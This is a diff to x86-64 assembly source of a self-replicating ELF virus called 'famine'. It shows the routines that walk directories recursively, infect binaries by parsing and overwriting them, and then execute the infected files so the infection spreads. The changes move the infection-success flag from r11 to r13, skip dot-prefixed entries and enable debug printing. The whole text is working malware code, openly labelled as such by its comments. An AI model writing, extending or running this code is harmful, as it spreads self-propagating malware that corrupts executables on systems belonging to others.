@@ -499,6 +499,8 @@ list_files:
 			lea rsi, [r9 + 19];filename
 			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 + 18]
 			jne maybe_reg_file
+			cmp byte[r9 + 19], '.'
+			je skip_file
 			mov rdi, rsi; pass fname as arg
 			call handle_dir
 			jmp skip_file
@@ -533,6 +535,7 @@ handle_dir:
 	cmp rax, 0
 	jne hd_parent
 	mov rax, 80
+	call ft_puts
 	syscall;chdir(fname);
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]	
@@ -593,7 +596,7 @@ rec_infect_dir:
 			jne rec_skip_file
 			mov rdi, rsi; pass fname as arg
 			call famine_file ; void famine_file(char * fname);
-			cmp r11, 0
+			cmp r13, 0
 			je rec_skip_file; we still need to find a file able to infect others
 			lea rdi, [r9 + 19];filename
 			call launch_infected
@@ -620,7 +623,7 @@ retn
 ;void launch_infected(char *fname)
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
-	;call ft_puts
+	call ft_puts
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
@@ -635,7 +638,7 @@ retn
 
 ;infect ONE file
 ;int famine_file(char *fname)
-;special note : ret value will be in r11, will return 1 if binary is able to infect others, 0 otherwise
+;special note : ret value will be in r13, will return 1 if binary is able to infect others, 0 otherwise
 famine_file:
 	push rbx
 	push rcx
@@ -653,7 +656,7 @@ famine_file:
 	sub rsp, 4 ;fd
 	
 	;call ft_puts ;PRINT FNAME FOR DEBUGGING
-	xor r11, r11
+	xor r13, r13
 	mov [rsp + 20], rdi
 	call open_file
 	cmp rax, -1
@@ -698,7 +701,7 @@ famine_file:
 	call parse64elf
 	mov rdi, [rsp + 20]; fname 
 	call overwrite_file
-	mov r11, 1
+	mov r13, 1
 	jmp leave_famine_file
 	;32BIT FILE
 	file32bit:
